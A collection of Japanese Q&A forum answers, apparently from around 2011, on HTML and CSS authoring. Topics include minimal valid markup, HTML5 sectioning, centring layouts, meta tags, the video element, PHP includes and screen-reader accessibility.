　</div> 　<div class="section"> 　　<h2>章見出し</h2> 　　・・記事本文・・ 　</div> 　<div class="footer"> 　　フッター 　</div> </body> HTML5だと <body> 　<header> 　　ヘッダ部分、ナビゲーションを含むこともあるでしょう。 　</header> 　<section> 　　<h2>章見出し</h2> 　　・・記事本文・・ 　</section> 　<footer> 　　フッター 　</footer> </body> ★ウェブマスター向けガイドライン - ウェブマスター ツール ヘルプ ( http://www.google.com/support/webmasters/bin/ans … ) 　は大変役に立ちます。 また、 3.1. 新しい要素 ( http://standards.mitsue.co.jp/resources/w3c/TR/h … ) なども・・
No.2です。いつもの癖で回りくどくてごめんなさい。 「記事を挿入加筆して、加筆者がわかるようにする」タグは<INS>です。多くのブラウザで加筆部分にアンダーラインが引かれマウス(ポインター)を乗せれば、title(に加筆者名を書いておけば、それが)が表示されます。 　まったく表に出さないなら、<!-- コメント -->です。もちろんいずれにしろHTMLソースを見ればわかります。 　詳しくはNo.2の回答を
> HTMLの最小単位 「文法的に」間違いです。HTML 4.0 であれば、「文法的に妥当な」最小コードはこうです。 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"> <title></title><p> ※Strict なので p の開始タグだけ書いています。終了タグはいりません。 --- HTML 4.0 は文書型宣言が必須です。なぜそうかと言えば、本来の目的のひとつはタグ省略を許すためです。 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"> 上記によって、HTML パーサは HTML 4.01 のルールで文書を解析すれば良いと分かります。 <title> さてここで、この位置には「ありえない」title 要素の開始タグが現れました。ルールを確認すると、ここに本来あるべき html の開始タグは省略可能となっています。そこで、開始タグを補います。 <html><title> 再びルールを確認すると、html の子に title は置けません。本来あるべき head 要素の開始タグを補います。 <html><head><title> これで title が置けるようになりました。次。 </title><p> title の隣に p は置けません。ルールを確認すると、p は body の子であること、body の開始タグは省略可であることが分かります。開始タグを補います。 </title><body><p> まだ足りませんね。title の隣に body は置けません。ルールを確認。head の終了タグは省略可。なら、終了タグを補います。 </title></head><body><p> 以下、同じようにやっていきます。結果的に次のような HTML ができ上がります。 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"> <html><head><title></title></head><body><p></p></body></html> もちろん、省略不可とされたものは省略できません。title の開始タグと終了タグはどちらも省略不可です。だから、No.3 の「<p>あいうえお</p>」だけでは不可です。ルールを確認するための文書型宣言もありませんから。 ※しかし XHTML なら構いません。ややこしいですね。 だから、タグ短縮・省略自体は HTML のルールに基づく真っ当な方法です。 --- HTML5 なら、最小形はこうです。ちゃんと Validator を通ります。 <!DOCTYPE html> <title></title> しかしながら、とある現実的な理由から、body の開始タグだけは書いた方が無難です。それと、文字コード宣言もなるべく書くようにしましょう。 <!DOCTYPE html> <meta charset="..."> <title></title> <body> これだけで十分です。<html> だの </html> だのは不要です。 もちろん、気持ち悪いから避けるのは構いません。ただ、省略できるものを省略せずに、省略できないものを省略している例文が巷には大量にあります。それはそれで、変な話でしょう。
HTMLに間違いがある ★Another HTML-lint gateway ( http://openlab.ring.gr.jp/k16/htmllint/htmllint. … ) ★The W3C Markup Validation Service ( http://validator.w3.org/#validate_by_input ) などで検証してみてください。 　たぶん<a href="top">タグが閉じられていないとか・・
FLVが自作なら作成時に設置出来るはずですが（私は経験がないので分かりません）、 第三者が作成したものならそのままではどうすることも出来ません。 再生や一時停止などのボタンを後から設置するなら、 ソフトを使ってコントロールパネルに相当するスキンを作成するしかないと思います。 例えば「Any FLV Player」 これはスキン生成からHTML出力まですべて全自動でやってくれます。
カテゴリー違いですが・・ AVERAGE(C3:D4,F3:G3)と,で区切って並べる・・
つまり質問者さんは、WEBページ上のテキストBOXに任意の文字を入力し、ボタンを押せば その画像が表示できるようしたいのですか？ これは無理です。javaスクリプトである程度のことは出来ますが、その画像のおいてある場所が 固定されていないと駄目です。基本的にはそのhtmlファイルが置いてある階層にイメージの置く 必要がありますね。そこにある限られた画像に関してなら可能です。 このような無駄なことをせずあらかじめ複数のボタンを用意し（インプットはサブミットにします） そのボタンに画像のハイパーリンクを張っておけばスクリプトなど使わずにできます。 普通はページ上にはサムネイルやテキスト文があってそれにハイパーリンクが張ってあります。 テキストボックスを利用したい意図が理解できません。
気になるサイトがあったら、ソースを見てみましょう。 だいたいの方法はわかるかと思います。
もじはばがたりなくて２だんになって・・・
htmlでは限界があります。 サーバーサイドのプログラムで処理すればhttpヘッダを操作できるので 場合分けができるかもしれません
No1です。 >プロバイダ＝Niftyで”http://homepage3.nifty.com/xxxxx/” を使用しております。 とのことですが、 http://homepage.nifty.com/outline/ によると、 LaCoocan　スタンダード以上でPHPを含むCGIスクリプトが利用可能です。
テーブルを使うか使わないかは制作者の自由です。 制作者が「これは表です」と言い張るならそれは表なので、どう表現するかの問題です。 なので、 文章構造も多々あり、ベストではなくベターの判断です。 文法的に、不正とかの話は別です。 ただ、 見た限りでは、フォームは表では無いようなのでリストで良いと思います。 CSSで各種の疑似テーブル化が可能です。 下記データは、表と言えば表ですが、これもリストで良いでしょう。 400項目ものテーブルだとブラウザにより表示が遅くなる可能性はあります。 再現したところ、通常サイズでフォントが段落ちするし、 手狭な感じがするので、800px幅程度が良いかと思います。 colspan=""の合計数値も変ですね・・・ 添付画像：　table非利用で再現する事も出来ます。
HTMLの歴史をおさらいすると、よくわかります。 元々は科学技術関係で開発された技術であることに由来します。 ★14.1 スタイルシートの概説 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) をよくお読みください。 　そして、 ★2.4.1 構造とプレゼンテーションの分離 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) ★2.2.1 HTMLの略歴 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　この仕様書が勧告になったのは、１９９９年１２月ですから、まもなく１２年になります。 　この仕様書の随所で書かれているのは、ユーザーエージェントはサポートしなければならないが、著者は使わないように・・です。それぞれどの要素がそれに当たるかは ★要素索引 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) のD,L,Fと書かれているものです。 　HTML5では、HTML4.01の時代から十数年経過しましたから 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから 次に挙げる要素は HTML5 に存在しません。なぜならこれらの要素は表象的であり、またそれらの機能は CSS にて扱われるべきだからです。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［HTML5 における HTML4 からの変更点( http://standards.mitsue.co.jp/resources/w3c/TR/h … )］より 　となっています。さらに、「著者が使えるもの」と「ユーザーエージェントがサポートしなければならないもの」に明確になりました。 marqyeeは、すでに4.01の時代からありませんので論外ですが、「HTMLは文書の構造をマークアップするもの」「スタイルシートでプレゼンテーションを指定する」とはっきりと区別しておくほうが良いですし、そうすべきでした。 　HTML4.01が勧告されて、十数年経つのに、いまだにtransitinalが使われ続けていることのほうがおかしい。 　
とりあえず、青空文庫など著作権フリーの所から好きな作家のテキストを拝借し、タグ付けしてみるのをお勧めします。その後、それ用のスタイルシートを書いてみます（なるべく変な ID/CLASS を振らず、タイプセレクタを使うよう心がけて下さい）。 HTML は文章内容をマークアップするものなのに、作り始めのうちは肝心の「内容」がなかなか増えません。だから、「とりあえずガワ（デザイン・レイアウト）だけ作って、内容は後で考えよう」になることが多いわけですが、それだとレイアウトありきの変な HTML になりがちなわけで。 何をおいても、大切なのは内容です。内容さえあれば、HTML なんぞ 30 分もあれば覚えられます。
ツール→オプション→一般 で □HTMLソースを自動整形する □HTML構文エラーを自動修正する でチェックが入っていませんか？ チェックを外すことで勝手に変更されることはありません。 エラー表示が鬱陶しいなら HTML構文エラー時の動作で切り替えもできます。 ツール→オプション→ファイル にて、DOCTYPEの設定もできますが、 いろんなファイルを弄る環境でしたら、 チェックを外しておくと良いと思います。
出来ません。 head内のLINK要素に書くしかありません。
OSやサーバーとは無関係です。WindowsXPはUNICODEを使ってますし・・ 　単にchearsetの記述を変えるだけでなく、その文書のcharsetも変換しないとダメです。 情報が決定的に足りませんが、想像ではjsファイルの中にShift_JISの箇所があれば、それも訂正し、かつ他のデータを利用するならそれも変換しておく必要があります。 ＞左メニューに、twitterヴィジェットが表示されていたのですが、先日から表示がされなくなり 　何もしていないのにそうなったのだとしたら、原因は文字コードではなかった可能性もあります。何をしたのですか？それともしないのですか？
わすれてました。 sitemap作成ツールがたくさんあります。車輪を二度発明する余裕が無いときは便利かも SitemapGenerators - sitemap-generators - A collection of links to tools and code snippets that generate Sitemap files. - Sitemap generators create a Sitemap compliant with the Sitemap Protocol of sitemaps.org. - Google Project Hosting ( http://code.google.com/p/sitemap-generators/wiki … )
<body> <div style="text-align:center;"> あいうえお </div> </body> は、汎用「ブロック内のテキストを中央寄せにしなさい」と言う意味です。ブロック自体の巾はウィンドウ巾 <body> <div style="text-align:center;width:400px;"> あいうえお </div> </body> 汎用「ブロック内のテキストを中央寄せにしなさい」と言う意味です。ブロック自体の巾は400pxになります。 「中央寄せが解除され」ていません。 　ブロック自体を中央に配置したい場合は <div style="width:400px;margin-right:auto;margin-right:auto;"> ・・・marginは一括指定できますから <div style="width:400px;margin:0 auto;"> と書けます。さらにテキストも中央配置する場合は <div style="width:400px;margin:0 auto;text-align:center"> となります。
<!-- saved from url=(0013)about:internet --> は、javascriptやスタイルシートなどを含むHTMLをローカルで開くと、セキュリティ警告が出るのを防止する。--このファイルはインターネット上にあると判断せよ---と言っているに過ぎません。 　したがって、これがデザインが崩れる原因になるとは思えません。 　でれば、そのたびに許可を与えりゃ済むことです。 <!-- saved from url=(0013)about:internet -->を書くのは止めましょう。 そのうえで、HTMLとCSSを再点検しましょう。 ★Another HTML-lint gateway ( http://openlab.ring.gr.jp/k16/htmllint/htmllint. … ) ★W3C CSS 検証サービス ( http://jigsaw.w3.org/css-validator/#validate_by_ … )
サイトリンク？　の意味がわかりません。 参考URLは、指定テキスト欄でも、本文中でも入れられます。 それとも自分のウェブページのURLと言う意味ですか？ 　なら、それが自己サイトへの誘導とみなされれば、「そのURLは」削除の対象となります。 　自分のサイトのURLではなく、具体的なトラブルやソースコードなどを記されればよいかと・・
こんにちは。 　下記サイトをご参照ください。 　　http://ascii.jp/elem/000/000/602/602620/ 　　jQueryMobileを利用すると、簡単なHTMLでもそれなりのスマホ用のサイトに見えます。 　　上記は第一回なので、第二回以降も見てみてください。 では。
style=css=スタイルシートです。質問がなりたちません。 質問もあやふやな部分が多くもう少し、詳しく説明いただかないと、ｃｓｓをどの意味で使っておられるのかわからないです。 スタイルシートは、 1.別ファイルに書く方法 2.head内に書く方法 3.出てきた文中にかく方法 の3つがあります。どれもスタイルシートで、ｃｓｓです。3.の方法はスタイルシートとしては、もっとも恩恵を受けない、避けるべき方法ですが、それをご希望とも取れます。 個別に対応するには、今回の場合、 1.tdだけに罫線を引く方法（すべてのtdに罫線を付ける） 2.tdにクラスを付ける方法（ｔｄの中でも区別したtdに罫線を付ける） 3.文中（インライン）のtdに書く方法 があります。 つまり、別ファイルに書いたり、ページに1回だけ書くｃｓｓでも、特定のｔｄにだけ罫線を付けることは可能です。 どのスタイルをとるにしても、 border:1px solid #999; で適用できると思います。 もっともｃｓｓの恩恵が少なく、避けるほうがよいが、質問で求めているのは <td style="border:1px solid #999"> かな？と思います。 が >各セルの個数がバラバラなので、tableに指定すると、大きい外枠にborderが付いてしまいます。 これが原因でｃｓｓが使えないと思っておられるなら、誤解ですので、もっとよい方法別ファイルのcssに各方法をお勧めします。そして本当に、ｃｓｓが使えないなら、どの方法も有効になりません。今回どこを誤解されているのかわからず、エスパーしてみました。外していたらスルーください。
＃２、３です。 「Ajax超初心者です。」と書くくらいなら、人のコードを見るよりも先に「JavaScript」と「Ajax」はどうやって非同期通信をしているのかを調べましょう。
Webブラウザとは、ホームページを見るソフトです。 パソコン（windows系）に最初からついている、インターネットエクスプローラを利用されていると思います。 そのほかにもFirefox、chrome、Opera、Sfariなどもあります。そして、それぞれで、同じページでも表示結果が異なることがありますので、普段自分が使用していないブラウザでも表示確認をしたほうが、ホームページ作者としては安心です。上に挙げたソフトはすべて無料です。ネット上で配布されているので、ダウンロードし手順に従えばインストールできます。 普通はインターネットエクスプローラーに関連付けされているので、作成し保存したテキストファイルをダブルクリックすれば、サーバーにアップしなくても見れます。見れなければ、サーバーにアップしても見れません。 メモ帳で作成し、保存したテキストの後ろを.htmまたは.htmlにして保存していれば見られると思います。ダブルクリックですよ。やってみてください。
HTMLを変えていいならこれでもできますが。 <table> <tbody> <tr><td><img src="" align="left">あいうえお</td></tr> <tr><td><img src="" align="left">かきくけこ</td></tr> <tr><td><img src="" align="left">さしすせそ</td></tr> </tbody> </table> なぜ同じデザインになるものに、たくさんの書き方があるのかというと、 HTMLタグにそれぞれ意味があるからです。 HTMLを勉強すれば、その意味は必ず勉強の範疇に入るはずですので、わざわざ言う必要はないと思うのですが、、、 タグ辞典を読んでください。全部、意味が書いてあります。
#7様 足し算が出来なくって、お恥ずかしい限りです。ストンと落ちました。ありがとうございました。 #8様 仕様書に合わない！何故だ？と思ったのが誤解でした。お調べいただきありがとうございました。 kami222 様 妙な割り込み失礼しました。
NO.2回答者です（お礼拝見済み） おそらく、 <meta name="robots" content="index,follow" /> と書いていると思いますが、 index,followならデフォルトなので不要と言う事。 noindexの場合に書けば良いだけ、その場合はrobots.txtでも構わない。 indexの場合は、robots.txtすら不要。 （sitemapの道案内をしても良いけど） keywordsは、Googleが参照しないので不要という事。 書いても構わないですが・・・ discriptionは、全ページに書きますね。 （同じ文章など有り得ない話です・・・） NO.3さんがいうように、無ければ本文から参照してくれますが、 検索エンジンでは、 このdiscriptionから参照するケースも多いので、 魅力的で思わずクリックしたくなる文章を書いておけばクリック率がほんの少し上がるでしょう。 この辺はPPC広告でも重要ですが、 キャッチコピーが得意な方は設定した方が良いのでは？ ----------- head内なんて、必要最低限でOKです。 そんなに拘る必要も無いです。 そんなSEOを考えるよりも、訪問者が必要とする情報提供や しっかりした内容構成と構造に見合ったマークアップをした方が良いです。
CGIを使います。CSV自体がアプリケーション依存のテキストなので、 Perlメモ ( http://www.din.or.jp/~ohzaki/perl.htm#CSV2Values ) のような方法で、いったん配列に読み込んで、 foreach構文などで、ABC<input type="radio" name="ABC">などを作くると言う方法が良いでしょう。 ＞作成したチェックボックスは、チェックがされているか 　そのCGIで、サイドチェックすればよい。
>ORUKAさんはstrictで作る癖をせよと述べていますが、 >clearfixはstrictに耐えられるものですか。 strictにも対応します。ただし、vaildではないです。 まぁ、文法をちゃんと守っているブラウザもないですし、表示側のプログラムミス・文法解釈ミスもあるのですから、現実に対応するには、褒められないと知りつつ使うことが必要な場合もでてくることがあります。 >文法的にはおかしいと思ってますが、…… なんておっしゃっていたので、多少の文法違反、vaildにはこだわらない方かと思いました。 >新しいことに対応せよと言われた直後で >古いものに配慮というのも少し違和感があるので。 私は別に、古いものに配慮せよといっているわけではありません。配慮したければこうすればいいですよと提案しているだけです。文法通りにしたければ:afterで解決です（はっきりと、要望を示されていないのですが、display:table-cell;の使用なども選択肢に入ります）。それに対応しないブラウザが古すぎるので、切り捨てますってことです。 どのブラウザまで対応するのか。古いブラウザを文法違反をしてまで、表示させるのか、完璧な文法を目指し、現実的な表示は二の次にするのか、どちらも満たすデザインにするのか。cssはやめて他の方法をとるのか。選択するのはflyingbeeさんです。clearfixはcssでは、バリデータを通りませんが、htmlは通ります。 新しいことに対応？よくわからないですね。「clear=""」こういうタグはなくなりますが、style="clear:～"は無くなりません。タグで対応しないで、見た目はcssでというのは、ORUKA1951さんも私も共通していることですし、質問もclassを利用したｃｓｓ関係の質問だとおもいました。 一応文法違反テクニック（ハック）を使うメリット（今現在） ・ きめ細かいデザインができる。 ・ プログラムミス・解釈の違いをねじふせ他のブラウザと同一デザインを表現できる。 デメリット（将来） ・ブラウザがバージョンアップされた時、ハックが有効でなくなる場合がある。 ・カスタマイズやメンテナンスがしにくくなる。 どのブラウザに対応し、どの技術を使うか、使わないか、ご自分にいい落しどころが見つかるといいですね。
JavaScriptで、表示・非表示を切り替える。 表示・非表示は、displayを使う。 表示→block 非表示→none ではないかと思います。
質問されている場所についてですが、<h1>が長すぎます。 文法違反ではないのですが、パッと見てわかるような短いものをおすすめします。 質問範囲外の場所についてです。 DOCTYPE宣言を行いましょう。 <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /> と指定されているから、XHTMLでしょうか？ また、CSSを使用する場合 <meta http-equiv="content-style-type" content="text/css"> を指定する必要があります。 また、<style>にはtype属性を指定し、CSS部分はコメントで囲うように しましょう。 XHTMLサンプル <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitio … <html xmlns="http://www.w3.org/1999/xhtml" xml:lang="ja" lang="ja"> <head> <meta http-equiv="content-type" content="text/html; charset=UTF-8" /> <title>サンプル</title> </head> <body> <h1>サンプル</h1> サンプルへようこそ！<br /> 作者は、サンプルです。 </body> </html>
フルスクリーンにする（できる）のはFlashの機能であって、HTMLやブラウザの機能ではありません。 mp4を直接埋め込むのではなく、swfファイルを埋め込み、 そのswfの中からmp4の読み込みとActionScriptを使用してフルスクリーンになるようにしてください。 ウインドウサイズいっぱいにするだけであれば、 JavaScriptでウインドウサイズを調べて、widthとheightに代入すれば良いです。
お名前.comでは、上記AddTypeの指定は禁止のようですよ。 http://www.onamae-server.com/support/faq/sd/web/ … 不明なファイルということでダウンロードになるのでしょう。 前質問の続きですよね。拡張子.htmlで phpを動かせない、となると ■方法1. phpにする 読み込む側(.html) も php にする。 ■方法2. SSIを使う 読み込む側(.html) の拡張子を .shtml にして <!--#include file="xxx.php" --> とする ■方法3. Ajaxを使う どうしても拡張子を変えたくない場合は、Ajaxを使うとよいでしょう。 失礼ながらあまり詳しくないようですのでクドクドと書きますと 1.jquery.js をダウンロード 2.htmlの<head>で <script language="JavaScript" src="jquery.js"></script> (パスは適宜修正) 3.表示したい箇所に以下を入れてみる <div id="RssTest"></div> <script type="text/javascript"> $("#RssTest").load("xxx.php"); </script>
#1です。 先の回答でうまく表現できなかったのですが、 要するに、rssを取得して表示するのがそのサイトの目的であれば、 phpとhtmlをそれぞれ作る必要はないのではないか、と思ったのです。 php自体がそこまでできているのであれば、 最終行のechoでHTMLを頭から全部出力してやれば、 統合された一つのページですむのではないでしょうか。 echo "<a href=\"$url\" target=\"_blank\">$title (${itemday})</a><br />\n"; とされている部分を、 $itemday = ${itemday}; echo <<<HTML <html> <head></head> <body> … <a href="$url" target="_blank">$title($itemday)</a><br /> … </body> </html> HTML; のように、目的のページ全部をechoで出力してやるわけです。 サイトを分けないとダメな事情がおありなんでしょうか。
　paddingは、そのボックスモデルの内辺を決めるだけで、内容そのもの(ここだとテキスト--インライン要素)のマージンを決めるものではありません。 　floatする要素の外側を決めるのはmarginですが、そのボックスのサイズにmarginを加えたものの周囲の内容との隙間を決めます。 　わからないときは、仕様書を確認するのが正確な知識を得られます。 ★ボックスモデル ( http://www.swlab.it.okayama-u.ac.jp/man/rec-css2 … ) ★9.5 浮動体（Floats） ( http://www.swlab.it.okayama-u.ac.jp/man/rec-css2 … ) (注) 　この邦訳は、CSS2.0のものです。現在標準とされているCSS2.1( http://www.w3.org/TR/CSS2/ )で、いくつか変更がありますので注意してください。CSS2.1の邦訳はありません(知りません)。
HTML(ウェブページ)がきちんとマークアップされていれば、スタイルシートも簡単に書けるでしょう。 <body> 　<div class="header"> 　　<h1>見出し</h1> 　　<div class="nav"> 　　　<ol> 　　　　<li><a href="./">Top</a></li> 　　　　<li><a href="./news">News</a></li> 　　　　<li><a href="./product">Product</a></li> 　　　</ol> 　 </div> 　</div> 　<div class="article"> 　　<h2>見出し</h2> 　　<div clas="section1"> 　　　<p>段落</p> 　　</div> 　　<div clas="section1"> 　　　<p>段落</p> 　　</div> 　　<div class="contentTable"> 　　　<h3>目次</h3> 　　　<ol> 　　　　<li><a href="#section1">Section1</a></li> 　　　　<li><a href="#section2">Section2</a></li> 　　　　<li><a href="#section3">Section3</a></li> 　　　</ol> 　　</div> 　</div> 　<div class="footer"> 　</div> </body> だとして、 div.header,div.article{width:100%;position:relative;} div.article h2,div.article div.section{margin-left:21%;min-height:400px;} div.article div.contentTable{width:20%;position:absolute;top:0;left:0;height:100%;} とか・・ ＞付け足しで、ページ両サイドの領域に背景や色を入れるにはどうしたらいいのでしょうか？ body{background:****;} div.header,div.article{width:80%;min-width:450px;max-width:960px;margin:0 auto;position:relative;} 以下変更なし 　基本的に、HTMLさえきちんと文書構造にしたがって書かれていたら(プレゼンテーションや配置はHTMLでは扱わない)、スタイルシートでいかようにもレイアウトやプレゼンテーションは決められる。 　そうするとHTMLもCSSも簡潔でわかりやすくなる。HTMLだけ見て何が書かれているかわかること。CSSだけ見てどのように配置しようとしているかわかること。 　　
各ブラウザでの、<video>タグによる動画形式の対応状況です（2011年10月現在）。 ・Chrome　　: H.264（*.mp4）, WebM（*.webm）, OggTheora（*.ogv） ・Safari　　　 : H.264（*.mp4） ・IE9　　　　　: H.264（*.mp4） ・FireFox 3　: OggTheora（*.ogv） ・FireFox 4　: WebM（*.webm）, OggTheora（*.ogv） ・Opera　　　: WebM（*.webm）, OggTheora（*.ogv） 現時点ではChrome安定って感じなんですが、Googleでは既に公式アナウンスで「H.264形式のサポートを打ち切る」と発表しています。ですので来年以降は、Chromeの自動アップデートによりもしかしたら順次、H.264（MP4）形式の動画は再生出来なくなる可能性があります。 考え方としては、 <video src="ブラウザで対応している動画形式のURL"> <p>ブラウザで対応していない場合の注意書き。</p> </video> ～と言うのが基本書式となります。 現状ではまだまだ、IE8以下の環境の人がかなりの数居るので、かならず注意書きは必要かと思われます。何故なら、対応済みの最新版のIE9にアップデートしたくても、WindowsXPの場合はシステム上、IE8以上には出来ないので（かく言う自分もXPなのでIE8以下しか使えません）。業務で使ってる業界標準ソフトの多くがまだまだWindowsXP環境を必須としてるので、後数年はこの状況が続くと考えて下さい。 ＞YouTube動画へのリンク ああ、良くやりそうな勘違いですね(笑)。 まず、<video>タグはブラウザで動画を再生させるためのタグです。対してYouTube動画へのリンクは、特定の動画ファイルへのURLでは無く。あくまでもYouTube動画のサーバにアクセスし、サーバプログラムに特定の動画を呼び出してもらうためのリクエストURLです。つまり「http://www.youtube.com/watch?v=○○○」という動画自体がそもそも存在していないのです。 URLの「watch?v=○○○」の部分はファイル名などでは無く、前述の通りあくまでもYouTubeのサーバプログラムに対して、「○○○という暗号名が付けられた動画を見せて下さい」とお願いしてるだけに過ぎません。これはYouTubeの中でのみ通じる暗号名であって、実際に保存されている動画の名前は「U0hQTVJOUV9FSkNOMF9KSFVHOllPZjB2UlNTSk5F」～みたいな感じでかなり複雑冗長化されています。ちなみにコレは例として書いてるだけで、仮にこの様なファイル名を指定して呼び出しても、YouTube側のサーバの仕様で何も起きません（外部からの直リンクは弾かれるため）。 なので結論から言えば、直にYouTube動画へのURLを<video>タグのsrcとして代入してもエラーになり、結果的には何も表示されません。あくまでも<video>タグは、既存の動画配信サイト（YouTubeやニコニコなど）の手を借りずに、自前で用意した動画ファイルをタグ一つで簡単にブラウザ上で見る事が出来るようにするタグなのだと記憶して下さい。 ＞つまりどういう事だってばよ？？ 基本的に動画投稿サイトなどのURLを<video>タグのsrcに指定してもダメ。ただし将来的に何処かのサイトがそういうサービスをやり出すかもしれないけど、それは泥棒に金庫のカギを無料で貸し出す様な物なので、多分未来永劫永久に無いと思います(笑)。 <video>タグのsrcに指定して良いのは、ちゃんとファイルの存在が確認されていて、尚かつ各Userが使っているブラウザで再生可能な形式だった場合のみ有効になります。なので現状、もう既にこれだけ便利な動画投稿サイト（YouTubeやニコニコなど）が氾濫している世の中で、どれほどの実効性を持ったタグなのかは正直、微妙な存在です…。 なので使用状況としては専らローカル環境での、例えばソフトウェアの説明書をHTML5で作成し。その中で操作手順を解説した動画を見せるために使うとか？そんな限定的な状況での使用に限られるんじゃないかと思います。少なくとも現状の、GoogleとAppleの動画形式での対立なども考えると、宣伝文句とは裏腹にあまりweb界隈では使われなさそうな感じがしてます。 P.S. 単純にYouTube動画の再生とか秒送りとかをJavaScriptでコントロールしたいのであれば。YouTube側から正式なAPIが公開されてるので、それを用いれば割と簡単に実装出来ます（ある程度のJavaScriptの知識は必須ですが）。 ＞http://code.google.com/intl/ja/apis/youtube/js_a …
一番重要なのは速度です。 IT業界は常に進歩していますから、どんなに知識と技術が豊富でも、いつか必ず、新しい技術について調べたり、勉強し直す必要が出てきます。その時に、趣味ならばじっくり時間をかけて習得すればいいのですが、職業として取り組む以上、速度が最重要課題です。 速度＝自分の時給＝顧客の満足度と考えて下さい。クオリティが同等なら、速いことが至上です。一つの作業に時間をかければかけるほど時給が安くなります。最短で調べ、最短で学び、最短で習得し、使いこなすことです。 現場に出れば、顧客が表現したい、提供したいと思うことを、いかに速く、確実に実現できるかが勝負ですから、教材はあまり役に立ちません。とにかく「こなす」ことです。 例えば、自分でこんなサイトが作りたい、こんな機能を付加したいと思ったら、徹底的に調べ尽くし、片っ端から試すことです。しかも、常に速度を意識して。そうした経験を積み上げれば、必ず、顧客と対面した時に役に立ちます。
たとえば、HTMLソースコードの20行目に&amp;、30行目に&amp;amp;と書かれているとして、 30行目の&amp;amp;の表示をみて、20行目のが間違って表示されているのと勘違いするような感じではないでしょうか。 ソースコードと実際の表示を確認してみてください。
No.2です。 ＞それにしてもIEって結構強力に作られているんですね。 　いえ、IEが我々を最も悩ます一番の問題児なのです。いわゆるウェブ標準に従わない時代が長く、IEでなければ見られないページが氾濫してしまった。逆にウェブ標準のサイトがIEでは崩れてしまう。マイクロソフトは、過去との互換のためいつまでも、非標準にしがみついていたため、混乱が続きました。IE8あたりから、やっとウェブ標準に方向転換してくれましたが・・・。 　今後はといいたいところですが、マイクロソフト自身が「クソ」と言っているIE6もいまだに使い続けられています。そのため、ウェブ開発者はただひとつの問題児のために頭を抱えることが続いている。 　問題のあるサイトを問題があると指摘してくれないブラウザが、一番の困り者なのですよ。
特に難しいレベルではないと思います。 率直に、<hr>をデザインのために入れているくらいで、下記のようなHTMLで出来ます。これ以外に余分な要素や属性を加える必要はありません。基本はとにかく文書をその構造にしたがってマークアップすることです。 背景は、本文に水玉、本文中のulにグラデーション背景かな。 <body> ＿<div class="header"> ＿＿<h1>サンプル</h1> ＿＿<p><span>株 山本</span></p> ＿＿<div class="nav"> ＿＿＿<ol> ＿＿＿＿<li><a href="menue1">menue1</a></li> ＿＿＿＿<li><a href="menue2">menue2</a></li> ＿＿＿＿<li><a href="menue3">menue3</a></li> ＿＿＿＿<li><a href="menue4">menue4</a></li> ＿＿＿＿<li><a href="menue5">menue5</a></li> ＿＿＿＿<li><a href="menue6">menue6</a></li> ＿＿＿＿<li><a href="menue7">menue7</a></li> ＿＿＿＿<li><a href="menue8">menue8</a></li> ＿＿＿</ol> ＿＿</div> ＿＿<div class="section"> ＿＿＿<ul> ＿＿＿＿<li><img src="./images/sample.jpg" width="360" height="120" alt="商品１"> ＿＿＿＿＿<p>ここの簡単な記事が入る。</p> ＿＿＿＿</li> ＿＿＿＿<li><img src="./images/sample.jpg" width="360" height="120" alt="商品２"> ＿＿＿＿＿<p>ここの簡単な記事が入る。</p> ＿＿＿＿</li> ＿＿＿＿<li><img src="./images/sample.jpg" width="360" height="120" alt="商品３"> ＿＿＿＿＿<p>ここの簡単な記事が入る。</p> ＿＿＿＿</li> ＿＿＿＿<li><img src="./images/sample.jpg" width="360" height="120" alt="商品４"> ＿＿＿＿＿<p>ここの簡単な記事が入る。</p> ＿＿＿＿</li> ＿＿＿＿<li><img src="./images/sample.jpg" width="360" height="120" alt="商品５"> ＿＿＿＿＿<p>ここの簡単な記事が入る。</p> ＿＿＿＿</li> ＿＿＿＿<li><img src="./images/sample.jpg" width="360" height="120" alt="商品６"> ＿＿＿＿＿<p>ここの簡単な記事が入る。</p> ＿＿＿＿</li> ＿＿＿</ul> ＿＿＿<hr> ＿＿</div> ＿＿<div class="footer"> ＿＿＿<h3>文書情報</h3> ＿＿＿<ul> ＿＿＿＿<li><a href="./mail">メール</a></li> ＿＿＿＿<li><a href="./pr">プライバシー</a></li> ＿＿＿＿<li><a href="./pp">著作権</a></li> ＿＿＿</ul> ＿＿</div> </body> </html>
エクセルシートをHTMLテーブルに変換しちゃう君 (ββ) http://www.styleme.jp/tool/xls2html/ 少し、htmlを学ばれた上で、上記のようなツールを使われてはいかがでしょうか？楽ができます。お金をだすなら、dreamweaverなどでもコピペすらだけでできます。
　肝心なところを読み飛ばしてました。 　PC-talkerは、ブラウザではありませんからスタイルシートを理解して読み上げることは出来ません。 　PC-Talker単独ではなく、NetReaderやNVDAなどとの連携でないとダメです。 Web標準の日々レポート 「文書構造がもたらす利点 ～環境に依存しないコンテンツ～」 中村精親さん 辻勝利さん | Blog hamashun.com ( http://www.hamashun.com/blog/2007/07/web_4.html ) スクリーンリーダと音声ブラウザの種類とそれらの概要 - E-riverstyle Vanguard | CSSやXHTML,Javascriptやweb製作に関する事を紹介 ( http://blog.e-riverstyle.com/2010/02/post-75.html ) Make it accessible!: 2006年2月 ( http://otasweb.cocolog-nifty.com/otasweb/2006/02 … ) 　ただ、現実問題としては大変難しく読み上げを念頭に置くなら、当初からそれを念頭においてペーづしを作成し、視覚ブラウザ用にcontentプロパティで分を追加するほうがよいような気がします。
